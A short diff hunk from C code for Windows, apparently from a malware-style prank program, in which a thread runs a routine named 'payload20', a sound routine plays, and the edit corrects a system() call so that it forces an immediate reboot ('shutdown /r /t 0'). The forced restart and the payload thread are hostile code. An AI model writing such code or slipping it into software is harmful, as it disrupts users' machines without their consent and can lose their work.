@@ -866,7 +866,7 @@ int main() {
 			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload20, 0, 0, 0);
 			brutalsound();
 			Sleep(0x61A8u);
-			system("C:\\Windows\\System32\\shutdown /r t- 0");
+			system("C:\\Windows\\System32\\shutdown /r /t 0");
 		}
 	}
 }
